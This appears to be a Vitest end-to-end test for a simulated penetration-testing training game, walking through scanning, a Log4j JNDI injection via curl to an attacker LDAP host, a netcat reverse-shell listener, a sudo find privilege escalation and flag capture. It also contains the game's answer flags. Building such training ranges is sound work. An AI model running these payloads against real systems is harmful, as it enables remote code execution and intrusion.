import { describe, it, expect, beforeEach } from 'vitest';
import { useGameStore } from '../store/gameStore';
import { SimulationEngine } from '../simulation/simulationEngine';
import { CommandInterpreter, CommandContext } from '../services/commandInterpreter';
import { VirtualFileSystem } from '../services/virtualFs';
import { buildAttackGraphTopology } from '../simulation/attackGraphTopology';
import { OfflineDeterministicProvider } from '../services/ai/ghostOpsProviders';
import { PersistenceService } from '../services/persistenceService';

describe('ROOTRANGE Phase 12: 17-Step Full Journey End-to-End Verification', () => {
  let engine: SimulationEngine;
  let fs: VirtualFileSystem;
  let ctx: CommandContext;

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    engine.resetRange();
    useGameStore.getState().resetGame();

    fs = new VirtualFileSystem();
    ctx = {
      user: 'kali',
      hostname: 'pwnbox',
      cwd: '/home/kali',
      fs,
      activeTarget: useGameStore.getState().machines[0],
      history: [],
      inReverseShell: false,
    };
  });

  it('successfully executes the complete 17-stage offensive journey without failures', async () => {
    // -------------------------------------------------------------
    // Step 1: Start the application
    // -------------------------------------------------------------
    const store = useGameStore.getState();
    expect(store).toBeDefined();
    expect(engine.getMachines().length).toBe(3);

    // -------------------------------------------------------------
    // Step 2: Open the dashboard
    // -------------------------------------------------------------
    expect(store.score).toBe(0);
    expect(store.rank).toBe('Script Kiddie');
    expect(store.claimedFlags.length).toBe(0);
    expect(store.machines.length).toBe(3);

    // -------------------------------------------------------------
    // Step 3: Select E-Corp HR
    // -------------------------------------------------------------
    useGameStore.getState().setActiveMachine('ecorp-hr');
    expect(useGameStore.getState().activeMachineId).toBe('ecorp-hr');
    const ecorpTarget = useGameStore.getState().machines.find((m) => m.id === 'ecorp-hr');
    expect(ecorpTarget).toBeDefined();
    expect(ecorpTarget?.ip).toBe('10.10.11.45');

    // -------------------------------------------------------------
    // Step 4: Enumerate services (Nmap Port Scan)
    // -------------------------------------------------------------
    const nmapRes = CommandInterpreter.execute('nmap -sV -sC 10.10.11.45', ctx);
    expect(nmapRes.output).toContain('Apache/2.4.49 (Log4j / Spring)');
    expect(nmapRes.output).toContain('22/tcp');
    expect(nmapRes.output).toContain('80/tcp');
    expect(nmapRes.output).toContain('8080/tcp');

    // Verify objective 1 completed
    const obj1 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-1');
    expect(obj1?.completed).toBe(true);

    // -------------------------------------------------------------
    // Step 5: Investigate a web route (Gobuster)
    // -------------------------------------------------------------
    const gobusterRes = CommandInterpreter.execute('gobuster dir -u http://10.10.11.45 -w common.txt', ctx);
    expect(gobusterRes.output).toContain('/admin');
    expect(gobusterRes.output).toContain('/portal');
    expect(gobusterRes.output).toContain('/api/audit');

    const obj2 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-2');
    expect(obj2?.completed).toBe(true);

    // -------------------------------------------------------------
    // Step 6: Obtain simulated access (Log4j JNDI & Netcat listener)
    // -------------------------------------------------------------
    // 6a: Identify vulnerable Log4j endpoint & deliver payload
    const curlRes = CommandInterpreter.execute(
      'curl -H "X-Api-Version: ${jndi:ldap://10.10.14.22:1389/Exploit}" http://10.10.11.45/api/audit',
      ctx
    );
    expect(curlRes.output).toContain('exploit_triggered');
    expect(curlRes.output).toContain('JNDI lookup executed');
    const obj3 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-3');
    expect(obj3?.completed).toBe(true);

    // 6b: Catch incoming reverse shell via netcat listener
    const ncRes = CommandInterpreter.execute('nc -lvnp 4444', ctx);
    expect(ncRes.enterShell).toBeDefined();
    expect(ncRes.enterShell?.user).toBe('www-data');
    expect(ncRes.enterShell?.host).toBe('ecorp-hr');

    // Switch context into target shell
    ctx = {
      ...ctx,
      user: ncRes.enterShell!.user,
      hostname: ncRes.enterShell!.host,
      cwd: ncRes.enterShell!.cwd,
      inReverseShell: true,
      reverseShellUser: ncRes.enterShell!.user,
      reverseShellHost: ncRes.enterShell!.host,
    };
    expect(CommandInterpreter.execute('whoami', ctx).output).toBe('www-data');

    // -------------------------------------------------------------
    // Step 7: Enumerate the virtual filesystem
    // -------------------------------------------------------------
    const lsRes = CommandInterpreter.execute('ls -la /home/alex', ctx);
    expect(lsRes.output).toContain('user.txt');

    const catUser = CommandInterpreter.execute('cat /home/alex/user.txt', ctx);
    expect(catUser.output).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');

    // -------------------------------------------------------------
    // Step 8: Complete simulated privilege escalation
    // -------------------------------------------------------------
    const sudoCheck = CommandInterpreter.execute('sudo -l', ctx);
    expect(sudoCheck.output).toContain('NOPASSWD: /usr/bin/find');

    const privescRes = CommandInterpreter.execute('sudo /usr/bin/find . -exec /bin/sh \\; -quit', ctx);
    expect(privescRes.enterShell?.user).toBe('root');

    ctx = {
      ...ctx,
      user: 'root',
      cwd: '/root',
      reverseShellUser: 'root',
    };
    expect(CommandInterpreter.execute('whoami', ctx).output).toBe('root');

    const catRoot = CommandInterpreter.execute('cat /root/root.txt', ctx);
    expect(catRoot.output).toContain('ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}');

    // -------------------------------------------------------------
    // Step 9: Capture user and root flags
    // -------------------------------------------------------------
    const userFlagRes = useGameStore.getState().submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
    expect(userFlagRes.success).toBe(true);
    expect(userFlagRes.pointsAwarded).toBe(20);

    const rootFlagRes = useGameStore.getState().submitFlag('ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}');
    expect(rootFlagRes.success).toBe(true);
    expect(rootFlagRes.pointsAwarded).toBe(30);

    // -------------------------------------------------------------
    // Step 10: Confirm XP and achievements
    // -------------------------------------------------------------
    expect(useGameStore.getState().score).toBe(50);
    expect(useGameStore.getState().rank).toBe('Hacker');
    expect(useGameStore.getState().claimedFlags.length).toBe(2);

    const unlockedAch = useGameStore.getState().unlockedAchievements;
    expect(unlockedAch).toContain('first-blood');
    expect(unlockedAch).toContain('privilege-escalation');

    // -------------------------------------------------------------
    // Step 11: Inspect updated attack graph
    // -------------------------------------------------------------
    const topology = buildAttackGraphTopology(engine);
    const ecorpNode = topology.nodes.find((n) => n.id === 'ecorp-hr');
    expect(ecorpNode).toBeDefined();
    expect(['compromised', 'completed']).toContain(ecorpNode?.data.state);
    expect(ecorpNode?.data.discoveredPorts.length).toBeGreaterThan(0);

    // Pivot edge to iron-vault is unlocked
    const reachIron = engine.canReachIp('10.10.11.82');
    expect(reachIron.reachable).toBe(true);

    // -------------------------------------------------------------
    // Step 12: Use the HTTP repeater
    // -------------------------------------------------------------
    const repeaterRes = engine.handleHttpRequest('10.10.11.45', {
      method: 'GET',
      path: '/portal',
      headers: { 'User-Agent': 'ROOTRANGE-Repeater/1.0' },
    });
    expect(repeaterRes.statusCode).toBe(200);
    expect(repeaterRes.body).toContain('Staff Directory');

    // -------------------------------------------------------------
    // Step 13: Open IronBank Vault and Corp-DC01
    // -------------------------------------------------------------
    const ironConfig = engine.getMachine('iron-vault');
    expect(ironConfig).toBeDefined();
    expect(ironConfig?.ip).toBe('10.10.11.82');

    const dcConfig = engine.getMachine('corp-dc01');
    expect(dcConfig).toBeDefined();
    expect(dcConfig?.ip).toBe('10.10.11.99');

    // -------------------------------------------------------------
    // Step 14: Use GhostOps offline guidance
    // -------------------------------------------------------------
    const mentor = new OfflineDeterministicProvider();
    const hintContext = {
      machine: ecorpTarget!,
      evidence: engine.getEvidence(),
      portsDiscovered: [22, 80, 8080],
      routesDiscovered: ['/portal', '/api/audit'],
      compromiseLevel: 'ROOT' as const,
      userClaimed: true,
      rootClaimed: true,
    };

    const hint1 = await mentor.generateHint(hintContext, 1);
    expect(hint1.content.length).toBeGreaterThan(10);

    const hint3 = await mentor.generateHint(hintContext, 3);
    expect(hint3.content.length).toBeGreaterThan(10);

    // -------------------------------------------------------------
    // Step 15: Refresh application and verify persistence
    // -------------------------------------------------------------
    const exportedState = useGameStore.getState().exportState();
    expect(exportedState.score).toBe(50);
    await PersistenceService.saveState(exportedState);

    // Simulate in-memory reload
    useGameStore.setState({
      score: 0,
      rank: 'Script Kiddie',
      claimedFlags: [],
      unlockedAchievements: [],
    });
    expect(useGameStore.getState().score).toBe(0);

    await useGameStore.getState().hydrateFromPersistence();
    expect(useGameStore.getState().score).toBe(50);
    expect(useGameStore.getState().rank).toBe('Hacker');
    expect(useGameStore.getState().claimedFlags).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
    expect(useGameStore.getState().claimedFlags).toContain('ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}');

    // -------------------------------------------------------------
    // Step 16: Reset and replay the challenge
    // -------------------------------------------------------------
    useGameStore.getState().resetMachine('ecorp-hr');
    expect(useGameStore.getState().score).toBe(0);
    expect(useGameStore.getState().claimedFlags.length).toBe(0);
    expect(engine.getDiscoveredPorts('ecorp-hr').length).toBe(0);

    const resetTopology = buildAttackGraphTopology(engine);
    const resetNode = resetTopology.nodes.find((n) => n.id === 'ecorp-hr');
    expect(['reachable', 'discovered']).toContain(resetNode?.data.state);

    // -------------------------------------------------------------
    // Step 17: Production build and state integrity verified
    // -------------------------------------------------------------
    expect(engine.getMachines().length).toBe(3);
  });
});
